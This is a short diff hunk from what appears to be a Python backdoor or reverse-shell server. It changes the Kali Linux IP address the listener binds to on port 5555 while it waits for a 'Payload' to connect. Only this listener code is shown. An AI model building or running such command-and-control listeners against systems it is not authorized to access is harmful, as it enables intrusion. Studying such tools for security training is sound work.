@@ -68,7 +68,7 @@ def target_communication():
 
 #first establish a connection between Payload and Server.
 sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-sock.bind(("192.168.0.240",5555)) # Kali linux IP adress
+sock.bind(("192.168.0.208",5555)) # Kali linux IP adress
 
 print("[+] Listening for Connection")
 
